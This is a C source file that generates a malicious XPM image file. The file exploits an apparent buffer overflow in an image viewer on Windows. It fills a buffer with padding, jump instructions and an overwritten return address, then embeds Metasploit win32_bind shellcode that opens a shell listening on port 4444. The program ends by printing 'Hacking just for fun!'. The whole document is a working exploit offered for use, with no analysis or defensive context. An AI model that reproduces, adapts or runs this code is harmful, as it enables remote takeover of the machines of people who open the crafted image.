#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char XPMHeaders[] =
"\x2f\x2a\x20\x58\x50\x4d\x20\x2a\x2f\x0d\x0a\x73\x74\x61\x74\x69"
"\x63\x20\x63\x68\x61\x72\x20\x2a\x50\x69\x78\x6d\x61\x70\x5b\x5d"
"\x20\x3d\x20\x7b\x0d\x0a\x22\x35\x30\x39\x20\x34\x33\x38\x20\x32"
"\x35\x36\x20\x33\x22\x2c\x0d\x0a\x22";

/* win32_bind -  EXITFUNC=thread LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char shellcode[] =
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xfa"
"\x78\xbd\xc7\x83\xeb\xfc\xe2\xf4\x06\x12\x56\x8a\x12\x81\x42\x38"
"\x05\x18\x36\xab\xde\x5c\x36\x82\xc6\xf3\xc1\xc2\x82\x79\x52\x4c"
"\xb5\x60\x36\x98\xda\x79\x56\x8e\x71\x4c\x36\xc6\x14\x49\x7d\x5e"
"\x56\xfc\x7d\xb3\xfd\xb9\x77\xca\xfb\xba\x56\x33\xc1\x2c\x99\xef"
"\x8f\x9d\x36\x98\xde\x79\x56\xa1\x71\x74\xf6\x4c\xa5\x64\xbc\x2c"
"\xf9\x54\x36\x4e\x96\x5c\xa1\xa6\x39\x49\x66\xa3\x71\x3b\x8d\x4c"
"\xba\x74\x36\xb7\xe6\xd5\x36\x87\xf2\x26\xd5\x49\xb4\x76\x51\x97"
"\x05\xae\xdb\x94\x9c\x10\x8e\xf5\x92\x0f\xce\xf5\xa5\x2c\x42\x17"
"\x92\xb3\x50\x3b\xc1\x28\x42\x11\xa5\xf1\x58\xa1\x7b\x95\xb5\xc5"
"\xaf\x12\xbf\x38\x2a\x10\x64\xce\x0f\xd5\xea\x38\x2c\x2b\xee\x94"
"\xa9\x2b\xfe\x94\xb9\x2b\x42\x17\x9c\x10\xac\x9b\x9c\x2b\x34\x26"
"\x6f\x10\x19\xdd\x8a\xbf\xea\x38\x2c\x12\xad\x96\xaf\x87\x6d\xaf"
"\x5e\xd5\x93\x2e\xad\x87\x6b\x94\xaf\x87\x6d\xaf\x1f\x31\x3b\x8e"
"\xad\x87\x6b\x97\xae\x2c\xe8\x38\x2a\xeb\xd5\x20\x83\xbe\xc4\x90"
"\x05\xae\xe8\x38\x2a\x1e\xd7\xa3\x9c\x10\xde\xaa\x73\x9d\xd7\x97"
"\xa3\x51\x71\x4e\x1d\x12\xf9\x4e\x18\x49\x7d\x34\x50\x86\xff\xea"
"\x04\x3a\x91\x54\x77\x02\x85\x6c\x51\xd3\xd5\xb5\x04\xcb\xab\x38"
"\x8f\x3c\x42\x11\xa1\x2f\xef\x96\xab\x29\xd7\xc6\xab\x29\xe8\x96"
"\x05\xa8\xd5\x6a\x23\x7d\x73\x94\x05\xae\xd7\x38\x05\x4f\x42\x17"
"\x71\x2f\x41\x44\x3e\x1c\x42\x11\xa8\x87\x6d\xaf\x15\xb6\x5d\xa7"
"\xa9\x87\x6b\x38\x2a\x78\xbd\xc7";


int main(int argc, char *argv[])
{
	char EvilBuffer[6600]	= {0};
	FILE *XPMFile		= NULL;
	
	if (argc != 2)
	{
		printf("%s FileName", argv[0]);
		return 0;
	}

	memset(EvilBuffer, '\x41', 6600);
	memcpy(EvilBuffer, XPMHeaders, sizeof(XPMHeaders)-1);		//XPM File Header
	memcpy(EvilBuffer + 3757, "\x90\x90\xeb\x04", 4);		//Jmp 4
	memcpy(EvilBuffer + 3761, "\x71\x15\xfa\x7f", 4);		//7ffa1571
	memcpy(EvilBuffer + 3765, "\xE9\x43\xF4\xFF\xFF", 5);		//Jmp -3000
	//Insert ShellCode Into EvilBuffer
	memcpy(EvilBuffer +	1500, shellcode, sizeof(shellcode));
	//End of file
	memcpy(EvilBuffer+0x1916,"\x22\x0d\x0a\x29\x3b\x0d\x0a",7);

	XPMFile = fopen(argv[1], "wb");
	if (XPMFile == NULL)
	{
		printf("[-]Unable to access file %s.\n", argv[1]);
		return 0;
	}
	fwrite(EvilBuffer, 1, 6600, XPMFile);
	fclose(XPMFile);
	printf("[+] Make File %s Done! Hacking just for fun!\n", argv[1]);

	return 0;
}